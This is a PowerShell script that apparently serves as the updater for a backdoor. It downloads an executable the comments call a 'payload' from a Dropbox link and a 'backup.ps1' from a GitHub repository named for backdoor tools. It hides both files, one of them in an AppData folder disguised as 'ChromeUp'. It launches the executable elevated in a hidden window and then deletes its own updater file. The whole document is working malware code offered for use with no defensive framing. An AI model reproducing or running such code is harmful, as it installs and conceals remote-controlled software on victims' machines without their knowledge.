#change directory
cd $env:temp/sVBXKuz

#download updated payload
Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/36hpp0y42mkwe3rdv9uwc/wsappa-1.4.exe?rlkey=80dozbkw1nrlupsfyx0ff6rms&dl=0" -OutFile new_wsappa.exe

#remove old payload
remove-item wsappa.exe

#sleep
start-sleep 2

#change name
rename-item new_wsappa.exe wsappa.exe

# Set "Hidden" attribute on the file
$filePath = Join-Path $env:temp\sVBXKuz "wsappa.exe"
$attr = [System.IO.FileAttributes]::Hidden
[System.IO.File]::SetAttributes($filePath, $attr)

#start new payload
Start-Process -FilePath "wsappa.exe" -Verb RunAs -WindowStyle Hidden

#change directory
cd $env:appdata/ChromeUp/

#remove old backup
remove-item backup.ps1

#download new backup
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/backup.ps1" -OutFile backup.ps1

# Set "Hidden" attribute on the file
$filePath = Join-Path $env:appdata\ChromeUp "backup.ps1"
$attr = [System.IO.FileAttributes]::Hidden
[System.IO.File]::SetAttributes($filePath, $attr)

#sleep
start-sleep 2

#clean uo
powershell.exe /c Remove-Item $env:temp/sVBXKuz/updater.ps1
